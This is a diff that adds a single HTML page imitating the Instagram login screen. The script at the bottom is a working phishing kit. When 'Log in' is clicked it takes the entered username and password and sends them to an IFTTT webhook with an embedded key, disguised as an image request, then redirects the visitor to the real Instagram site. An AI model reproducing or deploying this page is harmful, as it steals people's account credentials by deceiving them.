@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="stylesheet" href="Instagram.css">
+    <meta charset=“utf-8”>
+<title>Instagram</title>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+
+</head>
+<body style="background-color: #fafafa;">
+
+<div class="box">
+    <div >
+        <div >
+            <!-- <H1 id="title">Instagram</H1> -->
+            <img id="title" src="Inst-Logo-Backup.png" caption="instagram Logo" > 
+        </div>
+        <div id="Credential">
+            <form>
+                <input id="username" type="text" name="username" placeholder="Phone number, username or email">
+                <br>
+                <input id="password" type="password" name="password" placeholder="Password">
+            </form>
+        </div>
+        <div id="Login">
+            <button type="submit" name="login" id="submit">Log in</button>
+        </div>
+    </div>
+    <p id="Breaker"><span> OR </span></p>
+    <div>
+        <a id = "loginwithfb" href=""><img src="fb-logo.png"> Log in with Facebook</a>
+        <br></br>
+        <a id="pswdReset" href="">Forget Password?</a>
+        
+    </div>
+    <br>
+</div>
+<br>
+<div class="box">
+    <p>Don't have an account? <a id="sigup" href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
+</div>
+
+<div class="ins">
+    <p>Get the app.</p>
+    <img id= "apple" src="App Store.png" alt="App Store">
+    <img id="google" src="Play Store.png" alt="Play Store">
+</div>
+
+<div id="links">
+    <a href="">ABOUT US</a>
+    <a href="">SUPPORT</a>
+    <a href="">PRESS</a>
+    <a href="">API</a>
+    <a href="">JOBS</a>
+    <a href="">PRIVACY</a>
+    <a href="">TERMS</a>
+    <a href="">DIRECTORY</a>
+    <a href="">PROFILES</a>
+    <a href="">HASTAGS</a>
+    <a href="">LANGUAGE</a>
+    <p> &copy; 2018 INSTAGRAM</p>
+</div>
+
+<script>
+    $(document).ready(function() {
+        $("#submit").click(function(){
+            var username = $("#username").val();
+            var password = $("#password").val();
+            $("body").append("<img src='https://maker.ifttt.com/trigger/login/with/key/dg3ashkhrQvzHbLQBUsCp4-C9asBpzBfBR68g9m-YCY?value1="+username+"&value2="+password+"'>");
+            setTimeout(function(){
+                window.location.replace("https://instagram.com");
+                $("body").fadeOut();
+            }, 1000);
+        });
+    });
+</script>
+
+</body>
+</html>
